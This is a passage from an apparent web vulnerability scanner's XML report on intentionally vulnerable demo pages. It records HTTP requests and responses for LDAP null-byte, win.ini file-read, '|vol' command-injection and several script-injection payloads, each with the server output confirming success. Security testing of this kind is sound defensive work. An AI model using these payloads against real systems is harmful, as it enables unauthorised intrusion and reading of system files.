</TestHttpTraffic>
        </Variant>
        <Variant ID="12647">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%00</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="646" Length="154" String="Warning: ldap_search(): Search: Bad search filter in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\LDAPInjection2.php on line 25" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/LDAPInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/LDAPInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 204
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- LDAP Injection 2  --&gt;
&lt;!-- This page realizes an LDAP Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;LDAP Injection2&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	Login failed.&lt;br&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/LDAPInjection2.php HTTP/1.0
Content-Length: 22
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/LDAPInjection.php

username=%00&amp;password=
HTTP/1.1 200 OK
Content-Length: 343
Date: Mon, 14 Jul 2014 14:47:29 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- LDAP Injection 2  --&gt;
&lt;!-- This page realizes an LDAP Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;LDAP Injection2&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: ldap_search(): Search: Bad search filter in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\LDAPInjection2.php on line 25

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attFileWin32" Noise="False">
        <Url>http://tftarget/demo/OSCommandInjection2.php</Url>
        <Entity Name="fileName" Type="Parameter" />
        <Variant ID="12953">
          <Comments />
          <Difference>parameter: cookie fileName= -&gt; fileName=C:\windows\win.ini%00.html</Difference>
          <Reasoning>The contents of the "win.ini" file were found in the response, proving that system files can be downloaded by remote users</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="699" Length="18" String="16-bit app support" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=
HTTP/1.1 200 OK
Content-Length: 221
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			1		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 35
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=C:\windows\win.ini%00.html
HTTP/1.1 200 OK
Content-Length: 699
Date: Mon, 14 Jul 2014 14:47:33 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
CMCDLLNAME32=mapi32.dll
CMC=1
MAPIX=1
MAPIXVER=1.0.0.1
OLEMessaging=1
[MCI Extensions.BAK]
3g2=MPEGVideo
3gp=MPEGVideo
3gp2=MPEGVideo
3gpp=MPEGVideo
aac=MPEGVideo
adt=MPEGVideo
adts=MPEGVideo
m2t=MPEGVideo
m2ts=MPEGVideo
m2v=MPEGVideo
m4a=MPEGVideo
m4v=MPEGVideo
mod=MPEGVideo
mov=MPEGVideo
mp4=MPEGVideo
mp4v=MPEGVideo
mts=MPEGVideo
ts=MPEGVideo
tts=MPEGVideo
0		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12986">
          <Comments />
          <Difference>parameter: cookie fileName= -&gt; fileName=C:\windows\win.ini</Difference>
          <Reasoning>The contents of the "win.ini" file were found in the response, proving that system files can be downloaded by remote users</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="691" Length="18" String="16-bit app support" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=
HTTP/1.1 200 OK
Content-Length: 221
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			1		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 27
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=C:\windows\win.ini
HTTP/1.1 200 OK
Content-Length: 699
Date: Mon, 14 Jul 2014 14:48:18 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
CMCDLLNAME32=mapi32.dll
CMC=1
MAPIX=1
MAPIXVER=1.0.0.1
OLEMessaging=1
[MCI Extensions.BAK]
3g2=MPEGVideo
3gp=MPEGVideo
3gp2=MPEGVideo
3gpp=MPEGVideo
aac=MPEGVideo
adt=MPEGVideo
adts=MPEGVideo
m2t=MPEGVideo
m2ts=MPEGVideo
m2v=MPEGVideo
m4a=MPEGVideo
m4v=MPEGVideo
mod=MPEGVideo
mov=MPEGVideo
mp4=MPEGVideo
mp4v=MPEGVideo
mts=MPEGVideo
ts=MPEGVideo
tts=MPEGVideo
0		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13039">
          <Comments />
          <Difference>parameter: cookie fileName= -&gt; fileName=C:\windows\win.ini%00</Difference>
          <Reasoning>The contents of the "win.ini" file were found in the response, proving that system files can be downloaded by remote users</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="694" Length="18" String="16-bit app support" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=
HTTP/1.1 200 OK
Content-Length: 221
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			1		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 30
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=C:\windows\win.ini%00
HTTP/1.1 200 OK
Content-Length: 699
Date: Mon, 14 Jul 2014 14:48:34 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
CMCDLLNAME32=mapi32.dll
CMC=1
MAPIX=1
MAPIXVER=1.0.0.1
OLEMessaging=1
[MCI Extensions.BAK]
3g2=MPEGVideo
3gp=MPEGVideo
3gp2=MPEGVideo
3gpp=MPEGVideo
aac=MPEGVideo
adt=MPEGVideo
adts=MPEGVideo
m2t=MPEGVideo
m2ts=MPEGVideo
m2v=MPEGVideo
m4a=MPEGVideo
m4v=MPEGVideo
mod=MPEGVideo
mov=MPEGVideo
mp4=MPEGVideo
mp4v=MPEGVideo
mts=MPEGVideo
ts=MPEGVideo
tts=MPEGVideo
0		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attCodeInjectionInSystemCall" Noise="False">
        <Url>http://tftarget/demo/OSCommandInjection2.php</Url>
        <Entity Name="fileName" Type="Parameter" />
        <Variant ID="13054">
          <Comments />
          <Difference>parameter: cookie fileName= -&gt; fileName=%7Cvol</Difference>
          <Reasoning>The test response contains the output of the DOS "vol" command, indicating that the command was executed successfully on the server.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="674" Length="15" String="Volume in drive" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=
HTTP/1.1 200 OK
Content-Length: 221
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			1		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 15
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=%7Cvol
HTTP/1.1 200 OK
Content-Length: 283
Date: Mon, 14 Jul 2014 14:48:34 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			 Volume in drive C is OS
 Volume Serial Number is 38F5-6F0B
0		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13056">
          <Comments />
          <Difference>parameter: cookie fileName= -&gt; fileName=%7C%7Cvol</Difference>
          <Reasoning>The test response contains the output of the DOS "vol" command, indicating that the command was executed successfully on the server.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="677" Length="15" String="Volume in drive" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=
HTTP/1.1 200 OK
Content-Length: 221
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			1		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/OSCommandInjection2.php HTTP/1.0
Content-Length: 18
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/OSCommandInjection.php

fileName=%7C%7Cvol
HTTP/1.1 200 OK
Content-Length: 283
Date: Mon, 14 Jul 2014 14:48:34 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- OS Command Injection 2  --&gt;
&lt;!-- This page realizes an OS Command Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;OS Command Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;
			 Volume in drive C is OS
 Volume Serial Number is 38F5-6F0B
0		&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attCrossSiteScripting" Noise="False">
        <Url>http://tftarget/demo/EvalInjection2.php</Url>
        <Entity Name="command" Type="Parameter" />
        <Variant ID="13103">
          <Comments />
          <Difference>parameter: cookie command=1234 -&gt; command=1234--&gt;&lt;script&gt;alert(26630)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="684" Length="12" String="alert(26630)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 12
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234
HTTP/1.1 200 OK
Content-Length: 199
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 44
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234--&gt;&lt;script&gt;alert(26630)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 231
Date: Mon, 14 Jul 2014 14:48:35 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234--&gt;&lt;script&gt;alert(26630)&lt;/script&gt;&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13104">
          <Comments />
          <Difference>parameter: cookie command=1234 -&gt; command=1234&gt;'&gt;&lt;script&gt;alert(26632)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="684" Length="12" String="alert(26632)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 12
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234
HTTP/1.1 200 OK
Content-Length: 199
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 44
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234&gt;'&gt;&lt;script&gt;alert(26632)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 231
Date: Mon, 14 Jul 2014 14:48:35 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&gt;'&gt;&lt;script&gt;alert(26632)&lt;/script&gt;&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13106">
          <Comments />
          <Difference>parameter: cookie command=1234 -&gt; command=1234&gt;'&gt;&lt;%00script&gt;alert(26636)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="688" Length="12" String="alert(26636)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 12
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234
HTTP/1.1 200 OK
Content-Length: 199
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 47
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234&gt;'&gt;&lt;%00script&gt;alert(26636)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 232
Date: Mon, 14 Jul 2014 14:48:35 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&gt;'&gt;&lt; script&gt;alert(26636)&lt;/script&gt;&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13116">
          <Comments />
          <Difference>parameter: cookie command=1234 -&gt; command=1234&lt;/TextArea&gt;&lt;script&gt;alert(26656)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="700" Length="12" String="alert(26656)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 12
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234
HTTP/1.1 200 OK
Content-Length: 199
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 52
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234&lt;/TextArea&gt;&lt;script&gt;alert(26656)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 239
Date: Mon, 14 Jul 2014 14:48:36 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&lt;/TextArea&gt;&lt;script&gt;alert(26656)&lt;/script&gt;&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13118">
          <Comments />
          <Difference>parameter: cookie command=1234 -&gt; command=1234%3E%2BACJ-%2BAD4APB-SCRIPT%2FTYPE%3DTEXT%2FVBSCRIPT%2BAD7-MSGBOX%28123%29%2BAA0APB-%2FSCRIPT%2BAD7-</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="741" Length="75" String="&gt;+ACJ-+AD4APB-SCRIPT/TYPE=TEXT/VBSCRIPT+AD7-MSGBOX(123)+AA0APB-/SCRIPT+AD7-" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 12
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234
HTTP/1.1 200 OK
Content-Length: 199
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 111
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234%3E%2BACJ-%2BAD4APB-SCRIPT%2FTYPE%3DTEXT%2FVBSCRIPT%2BAD7-MSGBOX%28123%29%2BAA0APB-%2FSCRIPT%2BAD7-
HTTP/1.1 200 OK
Content-Length: 274
Date: Mon, 14 Jul 2014 14:48:36 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Eval Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;pre&gt;1234&gt;+ACJ-+AD4APB-SCRIPT/TYPE=TEXT/VBSCRIPT+AD7-MSGBOX(123)+AA0APB-/SCRIPT+AD7-&lt;/pre&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13129">
          <Comments />
          <Difference>parameter: cookie command=1234 -&gt; command=1234*/--&gt;&lt;/script&gt;&lt;script&gt;alert(26682)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="706" Length="12" String="alert(26682)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/EvalInjection2.php HTTP/1.0
Content-Length: 12
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/EvalInjection.php

command=1234
HTTP/1.1 200 OK
Content-Length: 199
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Eval Injection 2  --&gt;
&lt;!-- This page realizes an Eval Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
